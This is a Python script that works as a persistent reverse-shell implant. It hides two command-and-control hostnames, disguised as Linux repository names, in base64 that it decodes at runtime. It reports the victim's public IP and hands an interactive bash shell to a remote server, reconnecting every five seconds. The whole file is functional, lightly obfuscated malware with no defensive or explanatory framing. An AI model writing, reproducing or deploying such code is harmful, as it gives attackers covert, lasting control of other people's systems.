#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import os
import pty
import select
import subprocess
import time
import urllib.request
import json
import sys
import base64

LOCKFILE = "/tmp/cached_script.lock"


OBFUSCATED_PRIMARY = "dWJ1bnR1LXJlcG8uc3RyYW5nbGVkLm5ldA=="  
OBFUSCATED_BACKUP  = "bGludXgteDg2LXRjcHVkcC5zdHJhbmdsZWQubmV0" 

def get_true_host_string(obfuscated_data):
    """Decodes pure Base64 strings directly in memory at runtime."""
    try:

        decoded_bytes = base64.b64decode(obfuscated_data)
        return decoded_bytes.decode('utf-8').strip()
    except:
        return "127.0.0.1"


PRIMARY_HOST = get_true_host_string(OBFUSCATED_PRIMARY)
BACKUP_HOST  = get_true_host_string(OBFUSCATED_BACKUP)

def check_and_acquire_lock():
    if os.path.exists(LOCKFILE):
        try:
            with open(LOCKFILE, "r") as f:
                pid = int(f.read().strip())
            os.kill(pid, 0)
            sys.exit(0)
        except (OSError, ValueError):
            pass

    try:
        with open(LOCKFILE, "w") as f:
            f.write(str(os.getpid()))
    except:
        pass

def remove_lock():
    try:
        if os.path.exists(LOCKFILE):
            os.remove(LOCKFILE)
    except:
        pass

def main():
    check_and_acquire_lock()
    
    true_ip = "Unknown IP"
    try:
        req = urllib.request.Request(
            "http://ipinfo.io", 
            headers={'User-Agent': 'curl/7.68.0'}
        )
        with urllib.request.urlopen(req, timeout=4) as response:
            raw_data = response.read().decode('utf-8', errors='ignore')
            true_ip = json.loads(raw_data).get("ip", "Unknown IP")
    except:
        true_ip = "127.0.0.1"

    while True:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            try:
                s.connect((PRIMARY_HOST, 8090))
            except Exception:
                s.close()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((BACKUP_HOST, 21))
            
            clean_ip_string = str(true_ip).strip()
            

            s.sendall(f"{clean_ip_string}\n".encode('utf-8'))
            s.sendall(b"\r\n")
            
            master, slave = os.openpty()
            p = subprocess.Popen(
                ["/bin/bash", "-i"], 
                stdin=slave, stdout=slave, stderr=slave, 
                preexec_fn=os.setsid
            )
            os.close(slave)

            while p.poll() is None:
                r, w, x = select.select([s, master], [], [], 5)
                if not r:
                    try:
                        s.send(b"\x00") 
                    except:
                        break
                    continue

                for fd in r:
                    if fd == s:
                        data = s.recv(4096)
                        if not data: 
                            break
                        os.write(master, data)
                    elif fd == master:
                        data = os.read(master, 4096)
                        if not data: 
                            break
                        s.send(data)
                else:
                    continue
                break
                
            try:
                p.terminate()
                p.wait(timeout=2)
            except:
                pass
        except Exception:
            pass
        finally:
            if s:
                try:
                    s.close()
                except:
                    pass
            
        time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    finally:
        remove_lock()
